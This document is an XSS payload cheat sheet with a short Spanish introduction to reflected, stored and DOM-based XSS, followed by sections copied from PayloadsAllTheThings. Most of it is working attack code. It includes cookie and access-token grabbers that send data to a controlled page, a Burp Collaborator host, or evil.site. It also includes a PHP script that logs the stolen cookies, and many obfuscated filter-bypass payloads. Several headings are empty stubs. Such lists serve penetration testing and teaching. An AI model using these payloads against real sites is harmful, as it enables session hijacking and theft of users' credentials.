
## Detalles de la vulnerabilidad

Cross-Site Scripting (XSS) es un tipo de vulnerabilidad de seguridad informática que normalmente se encuentra en las aplicaciones web. XSS permite a los atacantes inyectar código malicioso en un sitio web, que luego se ejecuta en el navegador de cualquiera que visite el sitio. Esto puede permitir a los atacantes robar información confidencial, como las credenciales de inicio de sesión del usuario, o realizar otras acciones maliciosas.

Hay 3 tipos principales de ataques XSS:

XSS reflejado: en un ataque XSS reflejado, el código malicioso está incrustado en un enlace que se envía a la víctima. Cuando la víctima hace clic en el enlace, el código se ejecuta en su navegador. Por ejemplo, un atacante podría crear un enlace que contenga JavaScript malicioso y enviárselo a la víctima en un correo electrónico. Cuando la víctima hace clic en el enlace, el código JavaScript se ejecuta en su navegador, lo que permite al atacante realizar diversas acciones, como robar sus credenciales de inicio de sesión.

XSS almacenado: en un ataque XSS almacenado, el código malicioso se almacena en el servidor y se ejecuta cada vez que se accede a la página vulnerable. Por ejemplo, un atacante podría inyectar código malicioso en un comentario de una publicación de blog. Cuando otros usuarios ven la publicación del blog, el código malicioso se ejecuta en sus navegadores, lo que permite al atacante realizar diversas acciones.

XSS basado en DOM: es un tipo de ataque XSS que ocurre cuando una aplicación web vulnerable modifica el DOM (Document Object Model) en el navegador del usuario. Esto puede suceder, por ejemplo, cuando se utiliza una entrada del usuario para actualizar el código HTML o JavaScript de la página de alguna manera. En un ataque XSS basado en DOM, el código malicioso no se envía al servidor, sino que se ejecuta directamente en el navegador del usuario. Esto puede dificultar la detección y prevención de este tipo de ataques, porque el servidor no tiene ningún registro del código malicioso.

### [Data grabber for XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss)

Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

Write the collected data into a file.

```html
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

#### XSS capture passwords
### [CORS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#cors)

```html
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

## [XSS in HTML/Applications](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)

### [Common Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads)

```js
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```


### [DOM based XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#dom-based-xss)

Based on a DOM XSS sink.

```js
#"><img src=/ onerror=alert(2)>
```

#### DOM based XSS innerHTML sink**
####DOM XSS in document.write sink using source location.search inside a select element**
####DOM XSS in AngularJS
####Reflected DOM XSS
####Stored DOM XSS
### [XSS in JS Context](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-js-context)

```js
-(confirm)(document.domain)//
; alert(1);//
// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
```

#### jQuery anchor href attribute sink
#### jQuery selector sink using a hashchange event
## [XSS in files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-files)

** NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.

```xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

### [XSS in XML](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-xml)

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

### [XSS in SVG](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-svg)

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

### Reflected XSS SVG markup allowe
### Reflected XSS in canonical link tag

## XSS to CSRF
## [Filter Bypass and exotic payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads)

### [Bypass case sensitive](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-case-sensitive)

```js
<sCrIpt>alert(1)</ScRipt>
```

### [Bypass tag blacklist](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-tag-blacklist)

```js
<script x>
<script x>alert('XSS')<script y>
```

### [Bypass word blacklist with code evaluation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-word-blacklist-with-code-evaluation)

```js
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

### [Bypass with incomplete html tag](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-with-incomplete-html-tag)

Works on IE/Firefox/Chrome/Safari

```js
<img src='1' onerror='alert(0)' <
```

### [Bypass quotes for string](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-quotes-for-string)

```js
String.fromCharCode(88,83,83)
```

### [Bypass quotes in script tag](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-quotes-in-script-tag)

```js
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
```

### [Bypass quotes in mousedown event](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-quotes-in-mousedown-event)

You can bypass a single quote with ' in an on mousedown event handler

```js
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
```

### [Bypass dot filter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-dot-filter)

```js
<script>window['alert'](document['domain'])</script>
```

Convert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777` [http://www.geektools.com/cgi-bin/ipconv.cgi](http://www.geektools.com/cgi-bin/ipconv.cgi)

```js
<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
```

Base64 encoding your XSS payload with Linux command: IE. `echo -n "alert(document.cookie)" | base64` == `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`

### [Bypass parenthesis for string](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-parenthesis-for-string)

```js
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
```

### [Bypass parenthesis and semi colon](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-parenthesis-and-semi-colon)

```js
// From @garethheyes
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>

// From @terjanq
<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>

// From @cgvwzq
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```

### [Bypass ">" using nothing](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass--using-nothing)

You don't need to close your tags.

```js
<svg onload=alert(1)//
```

### [Bypass "<" and ">" using ＜ and ＞](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass--and--using--and-)

Unicode Character U+FF1C and U+FF1E

```js
＜script/src=//evil.site/poc.js＞
```

### [Bypass ";" using another character](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass--using-another-character)

```js
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```

### [Bypass using HTML encoding](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-using-html-encoding)

```js
%26%2397;lert(1)
&#97;&#108;&#101;&#114;&#116;
></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
```


### Reflected XSS with <> URL Encoded
### Stored XSS into anchor href attribute “” URL Encoded
### Reflected XSS with <> URL Encoded into a JavaScript string
### Reflected XSS into HTML WAF Bypass
### Reflected XSS into HTML only custom tags accepted
### Reflected XSS into a JavaScript string with \ and “” escaped
### Reflected XSS with “ <> and ‘ escaped
### Stored XSS into onclick event with <> “” HTML Encoded and ‘ \ escaped
### Reflected XSS into a template literal with “” ‘ <> \ ` unicode encoded**
